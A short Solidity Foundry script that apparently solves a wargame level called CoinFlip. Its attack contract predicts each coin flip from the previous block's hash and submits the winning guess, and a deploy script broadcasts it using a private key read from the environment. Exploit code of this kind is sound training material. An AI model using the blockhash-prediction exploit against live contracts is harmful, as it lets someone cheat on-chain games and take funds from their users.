// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/CoinFlip.sol";

contract AttackContract {
    CoinFlip coinFlip = CoinFlip(payable(0x7c2D10e589fEe5823da4f7B3119801eA5D82Ec0F));
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flip = blockValue / FACTOR;
        bool side = flip == 1 ? true : false;
        if (side) {
            coinFlip.flip(true);
        } else {
            coinFlip.flip(false);
        }
    }

    receive() external payable {}
}

contract Level3Script is Script {
    AttackContract attackContract;

    function run() public {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        attackContract = new AttackContract();

        // Call This method 10 times on defrent blocks
        //  AttackContract(payable(0x336dD71Ae966eBE4207655095685867A20487b99));
        // attackContract.attack();

        vm.stopBroadcast();
    }
}
